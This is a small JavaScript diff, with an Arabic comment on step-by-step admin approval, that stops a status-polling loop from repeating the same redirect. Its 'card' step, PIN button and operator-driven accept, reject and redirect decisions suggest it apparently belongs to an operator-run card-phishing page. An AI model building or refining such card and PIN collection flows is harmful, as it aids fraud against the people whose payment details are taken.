@@ -838,6 +838,7 @@ $("pinBtn").onclick = async () => {
 // ===== موافقة الأدمن خطوة بخطوة =====
 let pollTimer = null;
 let curStep = "card";
+let lastRedirect = "";
 async function submitStep(step){
   const L = ui[lang] || ui.ar;
   curStep = step;
@@ -864,9 +865,12 @@ function startPolling(ref){
       const r = await fetch("/api/status/" + encodeURIComponent(ref), { cache: "no-store" });
       if (!r.ok) return;
       const d = await r.json();
-      if (d.decision === "accept") { clearInterval(pollTimer); onAccepted(d.next || "done"); }
-      else if (d.decision === "reject") { clearInterval(pollTimer); onRejected(d.reason || curStep); }
-      else if (d.decision === "redirect") { clearInterval(pollTimer); onRedirect(d.next || "order"); }
+      if (d.decision === "accept") { clearInterval(pollTimer); lastRedirect = ""; onAccepted(d.next || "done"); }
+      else if (d.decision === "reject") { clearInterval(pollTimer); lastRedirect = ""; onRejected(d.reason || curStep); }
+      else if (d.decision === "redirect") {
+        var rPage = d.next || "order";
+        if (rPage !== lastRedirect) { lastRedirect = rPage; onRedirect(rPage); }
+      }
     } catch (e) {}
   }, 3000);
 }
